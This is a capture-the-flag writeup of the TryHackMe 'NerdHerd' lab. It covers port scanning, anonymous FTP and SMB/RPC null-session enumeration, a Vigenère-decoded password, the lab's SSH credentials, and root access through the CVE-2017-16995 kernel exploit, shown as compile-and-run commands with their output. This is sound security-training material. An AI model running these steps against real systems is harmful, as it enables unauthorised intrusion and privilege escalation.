---
layout: default
title : m3dsec - NerdHerd Writeup
---

_**Sep 15, 2020**_


<div style="text-align:center"><img src="../../assets/images/thm_nerdherd/nerd-herd-1024x272.png" /></div>

<h2 id="Overview">Overview</h2>

My Writeup Explainning my approach Owning [NerdHerd](https://tryhackme.com/room/nerdherd) machine, Created by my friend [0xpr0N3rd](https://tryhackme.com/p/0xpr0N3rd), That i really had a good time solving it.

<div style="text-align:center"><img src="../../assets/images/thm_nerdherd/Nerd_Herd_assembly.png" /></div>


<br>
<h2 id="Target-Informations">Target Informations</h2>

```
IP ADDRESS  : 10.10.101.50
DOMAIN NAME : nerdherd.thm NERDHERD
ROOM URL    : https://tryhackme.com/room/nerdherd
DESCRIPTION : Hack your way into this easy/medium level legendary TV series "Chuck" themed box!
```

<br>

<h2 id="External-Enumeration">External Enumeration</h2>

We start with a quick nmap scan to kick things off.

```
m3dsec@local:~/nerdherd.thm$ nmap -p- -sC -sV -oN nmap/nmap_tcp_simple 10.10.101.50
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Sep 11 04:45 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.123.226
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0c:84:1b:36:b2:a2:e1:11:dd:6a:ef:42:7b:0d:bb:43 (RSA)
|   256 e2:5d:9e:e7:28:ea:d3:dd:d4:cc:20:86:a3:df:23:b8 (ECDSA)
|_  256 ec:be:23:7b:a9:4c:21:85:bc:a8:db:0e:7c:39:de:49 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1337/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: Host: NERDHERD; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Well, nmap got us something : 
- FTP service (21)
- SSH service (22)
- SMB server (445 - 139)
- A Web server on port (1337)


<br>

<h4 id="Ftp-Enumeration">Ftp Enumeration</h4>

Trying to login into FTP anonymously, we got a **.png** image

```
m3dsec@local:~/nerdherd.thm$ ncftp 10.10.101.50
NcFTP 3.2.5 (Feb 02, 2011) by Mike Gleason (http://www.NcFTP.com/contact/).
Connecting to 10.10.101.50...                                                                                                                                         
(vsFTPd 3.0.3)
Logging in...                                                                                                                                                         
Login successful.
Logged in to 10.10.101.50.                                                                                                                                            
ncftp / > ls -lt
drwxr-xr-x    3 ftp      ftp         4096   Sep 11 04:45   pub
ncftp / > cd pub/
Directory successfully changed.
ncftp /pub > ls
youfoundme.png
ncftp /pub > mget youfoundme.png 
youfoundme.png:                                         87.79 kB  127.35 kB/s  
```


Inspecting the image, we got the owner name, which is a little bit weird tho, it doesn't sound like a name.

```
m3dsec@local:~/nerdherd.thm/files/ftp$ exiftool youfoundme.png |grep -i owner
Owner Name                      : fijbxslz
```

`fijbxslz` looks like an encoded/rotated string, that we need to decode, but for now lets just save it, it may be usefull later.


<br>
<h4 id="SMB-Enueration">SMB Enumeration</h4>

As far as i go, SMB is one of the 1st services that i start pocking arround with.

Anonymously we can list shares, **nerdherd_classified** folder seems interesting, but we'll need a password to get read access, so lets keep moving

```
smbmap -P 445 -H 10.10.101.50 -d WORKGROUP
[+] Guest session   	IP: 10.10.101.50:445	Name: nerdherd.thm                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	nerdherd_classified                               	NO ACCESS	Samba on Ubuntu
	IPC$                                              	NO ACCESS	IPC Service (nerdherd server (Samba, Ubuntu))
```

<br>
<h4 id="RPC-Enumeration">RPC Enumeration</h4>

Its always a good idea to test if the [rpc](https://en.wikipedia.org/wiki/Remote_procedure_call) system is vulnerable to [null session attack](https://www.dummies.com/programming/networking/null-session-attacks-and-how-to-avoid-them/).
let’s see what we can do with a null session.

```
m3dsec@local:~/nerdherd.thm$ rpcclient -U '' 10.10.101.50
Enter WORKGROUP\'s password: 
rpcclient $> enumdomusers
user:[chuck] rid:[0x3e8]
rpcclient $> queryuser chuck
	User Name   :	chuck
	Full Name   :	ChuckBartowski
	Home Drive  :	\\nerdherd\chuck
	Dir Drive   :	
	Profile Path:	\\nerdherd\chuck\profile
rpcclient $> getdompwinfo
min_password_length: 5
password_properties: 0x00000000
rpcclient $> netshareenumall
netname: print$
	remark:	Printer Drivers
	path:	C:\var\lib\samba\printers
	password:	
netname: nerdherd_classified
	remark:	Samba on Ubuntu
	path:	C:\home\chuck\nerdherd_classified
	password:	
netname: IPC$
	remark:	IPC Service (nerdherd server (Samba, Ubuntu))
	path:	C:\tmp
	password:

```

From the above, we can conclude a few things:
1. The system is vulnerable to a null session attack.
2. The null session allow us to enumerate users, shares, password policies.
3. The most important info in this case is the username

<br>
<h4 id="Web-Server-Enumeration">Web Server Enumeration</h4>

Well, on this particular part, there is some rabbit holes u can fall into.

For example trying to bypass the login form on http://10.10.101.50:1337/admin/

At the end of the index page, it says `Maybe the answer is in here.`and its poiting to a [song in youtube](https://www.youtube.com/watch?v=9Gc4QTqslN4)

After being stuck for some time, i got a pretty big hint from a good friend of mine [0xpr0N3rd](https://tryhackme.com/p/0xpr0N3rd) aka the creator of the machine, and he says `bird is the word`, i was like whaat :joy:

And yes, if u listen closely to the song in that video, u'll see that the the whole lyrics are `bird is the word`


I tried to decode the eariler retrived string with the word bird

```
fijbxslz -> vignere decode (bird) -> easywkuw
fijbxslz -> vignere decode (birdistheword) -> easypass
```

Now we have a meaningfull password, i'll assume **chuck** password is **easypass**, and i will try it against previous services.


<br>
<h4 id="SMB-Access">SMB Access</h4>

The previously retrived credentials, worked over smb and now we have **READ** permission over **nerdherd_classified** folder

```
m3dsec@local:~/nerdherd.thm/files/ftp$ smbmap -P 445 -H 10.10.101.50 -d WORKGROUP -u chuck -p easypass 
[+] IP: 10.10.101.50:445	Name: nerdherd.thm                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	nerdherd_classified                               	READ ONLY	Samba on Ubuntu
	IPC$                                              	NO ACCESS	IPC Service (nerdherd server (Samba, Ubuntu))
```

Download the secret file from smb

```
m3dsec@local:~/nerdherd.thm/files/smb$ smbclient -U chuck \\\\10.10.101.50\\nerdherd_classified
Enter WORKGROUP\chuck's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 11 02:29:53 2020
  ..                                  D        0  Mon Sep 14 18:41:35 2020
  secr3t.txt                          N      125  Fri Sep 11 02:29:53 2020

		8124856 blocks of size 1024. 3176792 blocks available
smb: \> mget secr3t.txt
Get file secr3t.txt? yes
getting file \secr3t.txt of size 125 as secr3t.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit

m3dsec@local:~/nerdherd.thm/files/smb$ cat secr3t.txt
Ssssh! don't tell this anyone because you deserved it this far:
	check out "/this1sn0tadirect0ry"
Sincerely,
0xpr0N3rd <3
```

[0xpr0N3rd](https://tryhackme.com/p/0xpr0N3rd) have something for us, lets see what it is

```
m3dsec@local:~/nerdherd.thm/files/smb$ curl 10.10.101.50:1337/this1sn0tadirect0ry/creds.txt
alright, enough with the games.
here, take my ssh creds:
	chuck:th1s41ntmypa5s
```

Good game buddy, we know have ssh credentials.


<br>
<h2 id="Internal-Enumeration">Internal Enumeration:</h2>

With ssh, we got inside the target host as user **chuck**, and we noticed that:
1. the path is exportable.
2. user chuck is a member of sudoers group.
3. we have some pre-installed commpilers.

Normally when i see compilers i go directly and check the kernel version.

```
huck@nerdherd:~$ uname -a
Linux nerdherd 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

In this case [cve-2017-16995](https://www.exploit-db.com/exploits/45010) looks applicable


<br>
<h2 id="Privelege-escalation">Privelege escalation:</h2>

This time i'll be compiling the exploit on the target host, but 1st i'll transfer the exploit source code into the target host with ssh

```
m3dsec@local:~/nerdherd.thm$ scp /home/m3dsec/nerdherd.thm/exploit/cve-2017-16995.c chuck@10.10.101.50:/tmp/cve-2017-16995.c
chuck@10.10.101.50's password: th1s41ntmypa5s
```

Then compile it

```
chuck@nerdherd:/tmp$ gcc cve-2017-16995.c -o cve-2017-16995 -pthread
chuck@nerdherd:/tmp$ ./cve-2017-16995 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff880016009700
[*] Leaking sock struct from ffff88001a44ddc0
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88001ed29240
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88001ed29240
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(chuck)
# ls /root
root.txt
# sudo su
# id
uid=0(root) gid=0(root) groups=0(root)
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@nerdherd:/tmp$
```

As our object consist of getting the flags, we can do so easly with a grep command

```
root@nerdherd:/# grep -rn 'THM' 2>/dev/null
Binary file sbin/zramctl matches
opt/.root.txt:3:THM{REDACTED}
Binary file lib/modules/4.4.0-31-generic/kernel/sound/pci/cs46xx/snd-cs46xx.ko matches
/home/chuch/user.txt:THM{REDACTED}
Binary file root/.bash_history matches::THM{REDACTED}
...
```


<br>
<h2 id="Conclution">Conclution.</h2>

Machines with kernel exploits are rare these days, Thanks to my dude [0xpr0N3rd](https://tryhackme.com/p/0xpr0N3r) for such an amazing experiance.

<br>
<br>
Best Regards

[m3dsec](https://github.com/m3dsec).

<br>
<br>

[back to main()](../../index.md)

<br>